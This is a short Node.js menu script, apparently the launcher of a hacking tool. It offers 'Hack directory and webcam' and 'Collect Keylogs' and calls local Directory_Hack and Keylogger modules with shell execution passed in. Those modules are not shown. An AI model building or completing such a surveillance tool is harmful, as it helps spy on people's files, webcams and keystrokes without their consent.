const inquirer = require("inquirer");
const exec = require("child_process").exec;
const directoryHack = require("./Directory_Hack");
const keyLogger = require("./Keylogger");
// TODO Program should set parameters and open clien within terminal
inquirer
  .prompt([
    {
      type: "list",
      message: "Choose the action you wish to take",
      name: "action",
      choices: ["Hack directory and webcam", "Collect Keylogs"],
    },
  ])
  .then((answers) => {
    if (answers.action === "Hack directory and webcam") {
      directoryHack.hack(exec);
    } else if (answers. action === "Collect Keylogs"){
      keyLogger.hack(exec);
    }
  });
